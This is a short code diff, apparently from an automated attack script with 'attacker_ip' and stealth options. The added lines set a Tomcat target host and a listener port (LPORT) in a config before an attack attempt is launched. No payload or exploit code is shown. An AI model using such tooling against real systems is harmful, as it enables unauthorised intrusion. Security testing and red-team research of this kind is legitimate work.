@@ -113,6 +113,10 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
                 with open(config_tomcat_file) as c:
                     content = json.load(c)
                     print(content)
+                    content["TOMCATHOST_201914271"]=target_ip
+                    content["LPORT"]=LPORT
+                    print(content)
+
             
             session=mc.attempt_attack(attack_obj)
             #print(attack_obj.output)
